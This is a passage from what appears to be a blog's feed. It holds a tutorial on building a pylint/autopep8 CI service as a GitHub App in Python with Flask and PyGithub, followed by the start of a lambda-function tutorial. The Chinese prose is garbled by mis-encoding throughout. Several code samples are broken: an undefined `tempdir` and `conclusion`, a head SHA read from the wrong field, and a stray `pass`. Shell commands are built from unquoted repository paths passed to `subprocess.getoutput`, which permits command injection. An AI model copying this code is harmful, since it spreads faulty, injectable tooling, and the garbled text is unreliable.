href="https://docs.github.com/cn/developers/apps/setting-up-your-development-environment-to-create-a-github-app">https://docs.github.com/cn/developers/apps/setting-up-your-development-environment-to-create-a-github-app</a></p><ol><li>ä½¿ç”¨æœ¬åœ°æµ‹è¯•ï¼Œåˆ©ç”¨ smee è½¬å‘ github å›è°ƒåˆ°æœ¬åœ°</li></ol><p>è®¿é—® <a href="http://smee.io">smee.io</a> å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„ channelï¼Œæ¯”å¦‚ <a href="https://smee.io/LgDQ8xrhy0q2GeET%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8">https://smee.io/LgDQ8xrhy0q2GeETï¼Œç„¶åä½¿ç”¨</a> <code>pysmee</code> å‘½ä»¤è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å®‰è£…</span></span><br><span class="line">pip install pysmee</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿è¡Œå‘½ä»¤</span></span><br><span class="line">pysmee forward https://smee.io/LgDQ8xrhy0q2GeET http://localhost:5000/events</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨é¡¹ç›®ç›®å½• smee ä¸­çš„ node è„šæœ¬è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i</span><br><span class="line">npm run smee</span><br></pre></td></tr></table></figure><h2><span id="di-1-bu-fen-chuang-jian-jian-cha-api-jie-kou">ç¬¬ 1 éƒ¨åˆ† åˆ›å»ºæ£€æŸ¥ API æ¥å£</span></h2><h3><span id="bu-zou-1-1-geng-xin-ying-yong-cheng-xu-quan-xian">æ­¥éª¤ 1.1. æ›´æ–°åº”ç”¨ç¨‹åºæƒé™</span></h3><p>ä¸»è¦ä¸ºä»¥ä¸‹æƒé™ï¼š</p><ul><li>Repository permissions<ul><li>Checks: Read &amp; write</li><li>Contents: Read &amp; write</li><li>Pull requests: Read &amp; write</li></ul></li><li>Subscribe to events<ul><li>check suite</li><li>check run</li></ul></li></ul><h3><span id="bu-zou-1-2-tian-jia-shi-jian-chu-li">æ­¥éª¤ 1.2. æ·»åŠ äº‹ä»¶å¤„ç†</span></h3><p>å¯¹åº”äº Ruby ä¸­ä½¿ç”¨ Sinatra ä½œä¸º web æ¡†æ¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>Flask</code> ä½œä¸º web æ¡†æ¶ï¼Œå¹¶ç»“åˆ <code>PyGithub</code> è¿™ä¸ªåº“æä¾›çš„ github API å°è£…ï¼Œç”±äº PyGithub åœ¨å‘å¸ƒçš„ç‰ˆæœ¬ä¸­è¿˜æœªé›†æˆ check run å¯¹åº”çš„ APIï¼Œæ‰€ä»¥ä½¿ç”¨å…¶ <code>master</code> åˆ†æ”¯ä¸Šçš„ä»£ç ï¼Œæ·»åŠ  <code>git+https://github.com/PyGithub/PyGithub.git</code> åˆ° requirements.txt ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">APP_NAME = <span class="string">&quot;Octo PyLinter&quot;</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&quot;GITHUB_APP_ID&quot;</span>] = config.GITHUB_APP_ID</span><br><span class="line">app.config[<span class="string">&quot;GITHUB_KEY_FILE&quot;</span>] = config.GITHUB_KEY_FILE</span><br><span class="line">app.config[<span class="string">&quot;GITHUB_SECRET&quot;</span>] = config.GITHUB_SECRET</span><br><span class="line">app.config[<span class="string">&quot;GITHUB_APP_ROUTE&quot;</span>] = config.GITHUB_APP_ROUTE</span><br><span class="line"></span><br><span class="line">github_app = GithubAppFlask(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@github_app.on(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    [</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;check_suite.requested&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;check_suite.rerequested&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;check_run.rerequested&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    ]</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_check_run</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    client = github_app.github_app_installation.get_github_client()</span><br><span class="line">    head_sha = (</span><br><span class="line">        github_app.payload[<span class="string">&quot;check_run&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;check_run&quot;</span> <span class="keyword">in</span> github_app.payload</span><br><span class="line">        <span class="keyword">else</span> github_app.payload[<span class="string">&quot;check_suite&quot;</span>][<span class="string">&quot;head_sha&quot;</span>]</span><br><span class="line">    )</span><br><span class="line">    repo = client.get_repo(github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>])</span><br><span class="line">    repo.create_check_run(name=APP_NAME, head_sha=head_sha)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>GithubAppFlask</code> æä¾›ä¸‰ä¸ªåŠŸèƒ½ï¼š</p><ol><li>æä¾› github_app å°è£…ï¼›</li><li>æä¾› <code>on</code> è£…é¥°å™¨ï¼Œå¯¹äºä¸åŒ github åŠ¨ä½œåˆ†å‘å¤„ç†ï¼›</li><li>github webhook è®¤è¯ï¼›</li></ol><h3><span id="bu-zou-1-3-chuang-jian-check-run">æ­¥éª¤ 1.3. åˆ›å»º check run</span></h3><p>ä½¿ç”¨ PyGithub åº“çš„ <code>create_check_run</code> å¤„ç†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_check_run</span>():</span><br><span class="line">    client = github_app.github_app_installation.get_github_client()</span><br><span class="line">    head_sha = (</span><br><span class="line">        github_app.payload[<span class="string">&quot;check_run&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;check_run&quot;</span> <span class="keyword">in</span> github_app.payload</span><br><span class="line">        <span class="keyword">else</span> github_app.payload[<span class="string">&quot;check_suite&quot;</span>][<span class="string">&quot;head_sha&quot;</span>]</span><br><span class="line">    )</span><br><span class="line">    repo = client.get_repo(github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>])</span><br><span class="line">    repo.create_check_run(name=APP_NAME, head_sha=head_sha)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="bu-zou-1-4-geng-xin-check-run">æ­¥éª¤ 1.4. æ›´æ–° check run</span></h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@github_app.on(<span class="params">[<span class="string">&quot;check_run.created&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initiate_check_run</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Start the CI process&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check that the event is being sent to this app</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;app&quot;</span>][<span class="string">&quot;id&quot;</span>]) == config.GITHUB_APP_ID:</span><br><span class="line">        client = github_app.github_app_installation.get_github_client()</span><br><span class="line">        repo = client.get_repo(github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>])</span><br><span class="line">        check_run = repo.get_check_run(github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;id&quot;</span>])</span><br><span class="line">        <span class="comment"># Mark the check run as in process</span></span><br><span class="line">        check_run.edit(</span><br><span class="line">            name=APP_NAME,</span><br><span class="line">            status=<span class="string">&quot;in_progress&quot;</span>,</span><br><span class="line">            started_at=datetime.now(),</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ***** RUN A CI TEST *****</span></span><br><span class="line">        <span class="comment"># æš‚ç•¥</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Mark the check run as complete!</span></span><br><span class="line">        check_run.edit(</span><br><span class="line">            name=APP_NAME,</span><br><span class="line">            status=<span class="string">&quot;completed&quot;</span>,</span><br><span class="line">            completed_at=datetime.now(),</span><br><span class="line">            conclusion=conclusion</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><h2><span id="di-2-bu-fen-chuang-jian-octo-rubocop-ci-ce-shi">ç¬¬ 2 éƒ¨åˆ† åˆ›å»º Octo RuboCop CI æµ‹è¯•</span></h2><p>åŸæ•™ç¨‹ä½¿ç”¨ RuboCop ä½œä¸º ruby ä»£ç è¯­æ³•æ£€æŸ¥å’Œæ ¼å¼åŒ–å·¥å…·ï¼Œç›¸å¯¹åº”ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>pylint</code> ä½œä¸º python ä»£ç è¯­æ³•æ£€æŸ¥ï¼Œä½¿ç”¨ <code>autopep8</code> ä½œä¸ºæ ¼å¼åŒ–å·¥å…·ã€‚åŒæ ·ï¼Œå¯¹äºgité¡¹ç›®çš„æ“ä½œï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>GitPython</code> ç®€åŒ–æ“ä½œã€‚</p><h2><span id="bu-zou-2-1-tian-jia-python-wen-jian">æ­¥éª¤ 2.1. æ·»åŠ  Python æ–‡ä»¶</span></h2><p>æ·»åŠ è¦æ“ä½œçš„ python æ–‡ä»¶å³å¯ã€‚</p><h3><span id="bu-zou-2-2-ke-long-cang-ku">æ­¥éª¤ 2.2. å…‹éš†ä»“åº“</span></h3><p>ä½¿ç”¨ GitPython åº“å¤„ç†ï¼Œä½¿ç”¨ä¸´æ—¶ç›®å½•è¿›è¡Œå…‹éš†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">clone_repository</span>(<span class="params">full_repo_name, repository, ref, installation_token, clean=<span class="literal">False</span></span>):</span><br><span class="line">    repo_dir = tempfile.mkdtemp()</span><br><span class="line">    git.Git(repo_dir).clone(<span class="string">f&quot;https://x-access-token:<span class="subst">&#123;installation_token&#125;</span>@github.com/<span class="subst">&#123;full_repo_name&#125;</span>.git&quot;</span>)</span><br><span class="line">    <span class="comment"># pull and chekout</span></span><br><span class="line">    repo = git.Repo(<span class="string">f&quot;<span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>&quot;</span>)</span><br><span class="line">    repo.git.pull()</span><br><span class="line">    repo.git.checkout(ref)</span><br><span class="line">    <span class="keyword">if</span> clean:</span><br><span class="line">        shutil.rmtree(tempdir, ignore_errors=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> repo_dir</span><br></pre></td></tr></table></figure><p>è¿è¡Œ CI æµ‹è¯•ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ***** RUN A CI TEST *****</span></span><br><span class="line">full_repo_name = github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>]</span><br><span class="line">repository = github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;name&quot;</span>]</span><br><span class="line">head_sha = github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;head_sha&quot;</span>]</span><br><span class="line">repo_dir = clone_repository(</span><br><span class="line">    full_repo_name,</span><br><span class="line">    repository,</span><br><span class="line">    head_sha,</span><br><span class="line">    installation_token=github_app.github_app_installation.token,</span><br><span class="line">    clean=<span class="literal">True</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3><span id="bu-zou-2-3-yun-xing-pylint">æ­¥éª¤ 2.3. è¿è¡Œ pylint</span></h3><p>pylint è¿è¡Œå¹¶è¾“å‡ºjsonç»“æœã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">command = <span class="string">f&quot;pylint <span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>/**/*.py -f json&quot;</span></span><br><span class="line">report = subprocess.getoutput(command)</span><br><span class="line">shutil.rmtree(repo_dir)</span><br><span class="line">output = json.loads(report)</span><br></pre></td></tr></table></figure><h3><span id="bu-zou-2-4-shou-ji-pylint-cuo-wu">æ­¥éª¤ 2.4. æ”¶é›† pylint é”™è¯¯</span></h3><p>pylintç»“æœä¸ <code>rubocop</code> ç±»ä¼¼ï¼Œæ”¶é›†å¹¶è§£æç»“æœï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># lint</span></span><br><span class="line">max_annotations = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">annotations = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># RuboCop reports the number of errors found in &quot;offense_count&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">    conclusion = <span class="string">&quot;success&quot;</span></span><br><span class="line">    actions = <span class="literal">None</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    conclusion = <span class="string">&quot;neutral&quot;</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> output:</span><br><span class="line"></span><br><span class="line">        file_path = re.sub(<span class="string">f&quot;<span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>/&quot;</span>, <span class="string">&quot;&quot;</span>, file[<span class="string">&quot;path&quot;</span>])</span><br><span class="line">        annotation_level = <span class="string">&quot;notice&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse each offense to get details and location</span></span><br><span class="line">        <span class="comment"># Limit the number of annotations to 50</span></span><br><span class="line">        <span class="keyword">if</span> max_annotations == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        max_annotations -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        start_line = file[<span class="string">&quot;line&quot;</span>]</span><br><span class="line">        end_line = file[<span class="string">&quot;line&quot;</span>]</span><br><span class="line">        start_column = file[<span class="string">&quot;column&quot;</span>]</span><br><span class="line">        end_column = file[<span class="string">&quot;column&quot;</span>]</span><br><span class="line">        message = file[<span class="string">&quot;message&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Create a new annotation for each error</span></span><br><span class="line">        annotation = &#123;</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: file_path,</span><br><span class="line">            <span class="string">&quot;start_line&quot;</span>: start_line,</span><br><span class="line">            <span class="string">&quot;end_line&quot;</span>: end_line,</span><br><span class="line">            <span class="string">&quot;start_column&quot;</span>: start_column,</span><br><span class="line">            <span class="string">&quot;end_column&quot;</span>: end_column,</span><br><span class="line">            <span class="string">&quot;annotation_level&quot;</span>: annotation_level,</span><br><span class="line">            <span class="string">&quot;message&quot;</span>: message,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># # Annotations only support start and end columns on the same line</span></span><br><span class="line">        <span class="comment"># if start_line == end_line:</span></span><br><span class="line">        <span class="comment">#     annotation.merge(&#123;&quot;start_column&quot;: start_column, &quot;end_column&quot;: end_column&#125;)</span></span><br><span class="line"></span><br><span class="line">        annotations.append(annotation)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Need fix action</span></span><br><span class="line">    actions = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;label&quot;</span>: <span class="string">&quot;Fix this&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Automatically fix all linter notices.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;identifier&quot;</span>: <span class="string">&quot;fix_rubocop_notices&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h3><span id="bu-zou-2-5-shi-yong-ci-ce-shi-jie-guo-geng-xin-jian-cha-yun-xing">æ­¥éª¤ 2.5. ä½¿ç”¨ CI æµ‹è¯•ç»“æœæ›´æ–°æ£€æŸ¥è¿è¡Œ</span></h3><p>æ•´ç†ç»“æœï¼Œå¹¶æ·»åŠ ä¿®å¤åŠ¨ä½œï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">summary = (</span><br><span class="line">    <span class="string">f&quot;Summary\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;- Offense count: <span class="subst">&#123;<span class="built_in">len</span>(output)&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;- File count: <span class="subst">&#123;<span class="built_in">len</span>(<span class="built_in">set</span>([file[<span class="string">&#x27;path&#x27;</span>] <span class="keyword">for</span> file <span class="keyword">in</span> output]))&#125;</span>\n&quot;</span></span><br><span class="line">)</span><br><span class="line">text = <span class="string">&quot;Octo Pylinter version: pylint&quot;</span></span><br><span class="line"><span class="comment"># Mark the check run as complete!</span></span><br><span class="line">check_run.edit(</span><br><span class="line">    name=APP_NAME,</span><br><span class="line">    status=<span class="string">&quot;completed&quot;</span>,</span><br><span class="line">    completed_at=datetime.now(),</span><br><span class="line">    conclusion=conclusion,</span><br><span class="line">    output=&#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Octo Pylinter&quot;</span>,</span><br><span class="line">        <span class="string">&quot;summary&quot;</span>: summary,</span><br><span class="line">        <span class="string">&quot;text&quot;</span>: text,</span><br><span class="line">        <span class="string">&quot;annotations&quot;</span>: annotations,</span><br><span class="line">    &#125;,</span><br><span class="line">    actions=actions,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3><span id="bu-zou-2-6-zi-dong-xiu-fu-cuo-wu">æ­¥éª¤ 2.6. è‡ªåŠ¨ä¿®å¤é”™è¯¯</span></h3><p>æ²¿ç”¨ <code>fix_rubocop_notices</code> è¿™ä¸ª IDï¼Œä½¿ç”¨ <code>autopep8</code> åš python æ–‡ä»¶çš„ä¿®æ­£ï¼Œå°†ç»“æœä»¥ PR çš„æ–¹å¼æäº¤ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@github_app.on(<span class="params">[<span class="string">&quot;check_run.requested_action&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">take_requested_action</span>():</span><br><span class="line">    full_repo_name = github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>]</span><br><span class="line">    repository = github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    head_branch = github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;check_suite&quot;</span>][<span class="string">&quot;head_branch&quot;</span>]</span><br><span class="line">    check_run_id = github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> github_app.payload[<span class="string">&quot;requested_action&quot;</span>][<span class="string">&quot;identifier&quot;</span>] == <span class="string">&quot;fix_rubocop_notices&quot;</span>:</span><br><span class="line">        repo_dir = clone_repository(</span><br><span class="line">            full_repo_name,</span><br><span class="line">            repository,</span><br><span class="line">            head_branch,</span><br><span class="line">            installation_token=github_app.github_app_installation.token,</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># Automatically correct style errors</span></span><br><span class="line">        <span class="comment"># fix with autopep8</span></span><br><span class="line">        command = <span class="string">f&quot;autopep8 -a -i <span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>/**/*.py&quot;</span></span><br><span class="line">        report = subprocess.getoutput(command)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create new branch</span></span><br><span class="line">        new_branch = <span class="string">f&quot;fix_rubocop_notices_<span class="subst">&#123;check_run_id&#125;</span>&quot;</span></span><br><span class="line">        pushed = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            repo = git.Repo(<span class="string">f&quot;<span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> repo.index.diff(<span class="literal">None</span>) <span class="keyword">or</span> repo.untracked_files:</span><br><span class="line">                current = repo.create_head(new_branch)</span><br><span class="line">                current.checkout()</span><br><span class="line">                repo.config_writer().set_value(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;name&quot;</span>, config.GITHUB_APP_USER_NAME).release()</span><br><span class="line">                repo.config_writer().set_value(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;email&quot;</span>, config.GITHUB_APP_USER_EMAIL).release()</span><br><span class="line">                repo.git.add(update=<span class="literal">True</span>)</span><br><span class="line">                repo.git.commit(<span class="string">&quot;-m&quot;</span>, <span class="string">&quot;Automatically fix Octo RuboCop notices.&quot;</span>)</span><br><span class="line">                repo.git.push(<span class="string">&quot;--set-upstream&quot;</span>, <span class="string">&quot;origin&quot;</span>, current)</span><br><span class="line">                pushed = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;no changes&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failed to commit and push&quot;</span>)</span><br><span class="line">            <span class="comment"># # Nothing to commit!</span></span><br><span class="line">            <span class="comment"># print(&quot;Nothing to commit&quot;)</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            shutil.rmtree(repo_dir, ignore_errors=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pushed:</span><br><span class="line">            <span class="comment"># create pull request</span></span><br><span class="line">            client = github_app.github_app_installation.get_github_client()</span><br><span class="line">            repo = client.get_repo(full_repo_name)</span><br><span class="line">            body = <span class="string">&quot;&quot;&quot;Automatically fix Octo RuboCop notices.&quot;&quot;&quot;</span></span><br><span class="line">            pr = repo.create_pull(</span><br><span class="line">                title=<span class="string">&quot;Automatically fix Octo RuboCop notices.&quot;</span>, body=body, head=new_branch, base=<span class="string">&quot;master&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Pull Request number: <span class="subst">&#123;pr.number&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>åœ¨ä»¥ä¸Šæ­¥éª¤çš„åŸºç¡€ä¸Šï¼Œå¯ä»¥æ„å»ºæ›´å¤æ‚çš„æµ‹è¯•è¿‡ç¨‹ï¼Œå®Œæˆä¸åŒçš„éœ€æ±‚ã€‚</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä½¿ç”¨ Python é›†æˆ GitHub App å’Œ GitHub Check APIï¼Œæ„å»ºæŒç»­é›†æˆæœåŠ¡
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>08. Lambda å‡½æ•° â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-125/"/>
    <id>https://qiwihui.com/qiwihui-blog-125/</id>
    <published>2022-08-13T01:54:25.510Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Lambdaå‡½æ•°æ˜¯ä¸€ä¸ªå°çš„ï¼ˆä¸€è¡Œï¼‰åŒ¿åå‡½æ•°ï¼Œæ²¡æœ‰å‡½æ•°åç§°ã€‚ Lambdaå‡½æ•°å¯ä»¥æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°ï¼Œä½†åªèƒ½å…·æœ‰ä¸€ä¸ªè¡¨è¾¾å¼ã€‚ è™½ç„¶ä½¿ç”¨defå…³é”®å­—å®šä¹‰äº†æ™®é€šå‡½æ•°ï¼Œä½†åœ¨Pythonä¸­ï¼Œä½¿ç”¨lambdaå…³é”®å­—å®šä¹‰äº†åŒ¿åå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arguments: expression</span><br></pre></td></tr></table></figure><p>å½“ç®€å•å‡½æ•°ä»…åœ¨ä»£ç ä¸­ä½¿ç”¨ä¸€æ¬¡æˆ–çŸ­æ—¶é—´æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Lambdaå‡½æ•°ã€‚ æœ€å¸¸è§çš„ç”¨é€”æ˜¯ä½œä¸ºé«˜é˜¶å‡½æ•°ï¼ˆå°†å…¶ä»–å‡½æ•°ä½œä¸ºå‚æ•°çš„å‡½æ•°ï¼‰çš„å‚æ•°ã€‚ å®ƒä»¬è¿˜ä¸è¯¸å¦‚ <code>map()</code>ï¼Œ <code>filter()</code> ï¼Œ <code>reduce()</code>ä¹‹ç±»çš„å†…ç½®å‡½æ•°ä¸€èµ·ä½¿ç”¨ã€‚</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸€ä¸ªç»™å‚æ•°åŠ 10çš„lambdaå‡½æ•°</span></span><br><span class="line">f = <span class="keyword">lambda</span> x: x+<span class="number">10</span></span><br><span class="line">val1 = f(<span class="number">5</span>)</span><br><span class="line">val2 = f(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(val1, val2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€ä¸ªè¿”å›ä¸¤ä¸ªå‚æ•°ä¹˜ç§¯çš„lambdaå‡½æ•°</span></span><br><span class="line">f = <span class="keyword">lambda</span> x,y: x*y</span><br><span class="line">val3 = f(<span class="number">2</span>,<span class="number">10</span>)</span><br><span class="line">val4 = f(<span class="number">7</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(val3, val4)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span> <span class="number">110</span></span><br><span class="line"><span class="number">20</span> <span class="number">35</span></span><br></pre></td></tr></table></figure><h3><span id="shi-yong-shi-li-ling-yi-ge-han-shu-nei-de-lambda-han-shu">ä½¿ç”¨ç¤ºä¾‹ï¼šå¦ä¸€ä¸ªå‡½æ•°å†…çš„Lambdaå‡½æ•°</span></h3><p>ä»å¦ä¸€ä¸ªå‡½æ•°è¿”å›å®šåˆ¶çš„lambdaå‡½æ•°ï¼Œå¹¶æ ¹æ®éœ€è¦åˆ›å»ºä¸åŒçš„å‡½æ•°å˜ä½“ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: x * n</span><br><span class="line"></span><br><span class="line">doubler = myfunc(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(doubler(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">tripler = myfunc(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(tripler(<span class="number">6</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">18</span></span><br></pre></td></tr></table></figure><h3><span id="shi-yong-lambda-han-shu-zuo-wei-key-can-shu-de-zi-ding-yi-pai-xu">ä½¿ç”¨lambdaå‡½æ•°ä½œä¸ºkeyå‚æ•°çš„è‡ªå®šä¹‰æ’åº</span></h3><p>keyå‡½æ•°ä¼šåœ¨æ’åºä¹‹å‰è½¬æ¢æ¯ä¸ªå…ƒç´ ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">points2D = [(<span class="number">1</span>, <span class="number">9</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">5</span>, -<span class="number">3</span>), (<span class="number">10</span>, <span class="number">2</span>)]</span><br><span class="line">sorted_by_y = <span class="built_in">sorted</span>(points2D, key= <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(sorted_by_y)</span><br><span class="line"></span><br><span class="line">mylist = [- <span class="number">1</span>, -<span class="number">4</span>, -<span class="number">2</span>, -<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">sorted_by_abs = <span class="built_in">sorted</span>(mylist, key= <span class="keyword">lambda</span> x: <span class="built_in">abs</span>(x))</span><br><span class="line"><span class="built_in">print</span>(sorted_by_abs)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">5</span>, -<span class="number">3</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">10</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">9</span>)]</span><br><span class="line">[-<span class="number">1</span>, <span class="number">1</span>, -<span class="number">2</span>, <span class="number">2</span>, -<span class="number">3</span>, <span class="number">3</span>, -<span class="number">4</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><h3><span id="zai-map-han-shu-zhong-shi-yong-lambda-han-shu">åœ¨ map å‡½æ•°ä¸­ä½¿ç”¨ Lambda å‡½æ•°</span></h3><p><code>map(func, seq)</code> ï¼Œä½¿ç”¨å‡½æ•°è½¬æ¢æ¯ä¸ªå…ƒç´ ã€‚</p><figure class="highlight python"><table><tr><td 